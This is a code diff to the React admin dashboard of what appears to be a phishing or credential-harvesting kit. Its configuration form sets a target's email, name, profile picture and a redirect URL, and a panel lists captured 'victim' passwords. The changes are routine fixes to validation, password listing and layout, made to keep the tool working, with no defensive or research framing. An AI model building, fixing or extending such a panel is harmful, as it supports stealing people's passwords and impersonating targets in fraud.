@@ -35,7 +35,7 @@ type ConfigFormData = {
 const configSchema = z.object({
     targetEmail: z.string().email({ message: "Invalid email address." }),
     targetName: z.string().min(1, { message: "Name is required." }),
-    targetProfilePicture: z.string().url({ message: "Please enter a valid URL." }).or(z.string().optional()),
+    targetProfilePicture: z.string().url({ message: "Please enter a valid URL." }).or(z.string().optional()).or(z.literal('')),
     redirectUrl: z.string().url({ message: "Please enter a valid URL." }),
 });
 
@@ -300,9 +300,9 @@ export function AdminDashboard() {
                         </div>
                         <div className="p-4 bg-muted rounded-lg space-y-2">
                           <div className="font-mono text-sm"><strong>Passwords:</strong></div>
-                          {state?.victim.passwords && state.victim.passwords.length > 0 ? (
+                          {state?.victim.passwords && Object.values(state.victim.passwords).length > 0 ? (
                             <ul className="list-disc list-inside space-y-1">
-                              {state.victim.passwords.map((p, i) => <li key={i} className="font-mono text-sm">{p}</li>)}
+                              {Object.values(state.victim.passwords).map((p, i) => <li key={i} className="font-mono text-sm">{p}</li>)}
                             </ul>
                           ) : <div className="font-mono text-sm">---</div>}
                         </div>
@@ -337,13 +337,13 @@ export function AdminDashboard() {
                       <div>
                         <Label>Target Profile Picture</Label>
                         <div className="flex items-center gap-4 mt-2">
-                          {imagePreview || profilePictureUrl ? (
+                          {imagePreview || (profilePictureUrl && profilePictureUrl.startsWith('http')) ? (
                             <Image 
                               src={imagePreview || profilePictureUrl!}
                               alt="Profile Preview"
                               width={64}
                               height={64}
-                              className="rounded-full object-cover"
+                              className="rounded-full object-cover w-16 h-16"
                               data-ai-hint="person avatar" 
                             />
                           ) : (
@@ -351,7 +351,9 @@ export function AdminDashboard() {
                                 <UserCircle className="w-10 h-10 text-muted-foreground" />
                             </div>
                           )}
-                          <Input id="targetProfilePictureFile" type="file" accept="image/*" onChange={handleFileChange} />
+                           <div className="flex-grow">
+                             <Input id="targetProfilePictureFile" type="file" accept="image/*" onChange={handleFileChange} />
+                           </div>
                         </div>
                         {errors.targetProfilePicture && <p className="text-sm text-destructive mt-1">{errors.targetProfilePicture.message}</p>}
                       </div>
@@ -371,3 +373,5 @@ export function AdminDashboard() {
     </div>
   );
 }
+
+    
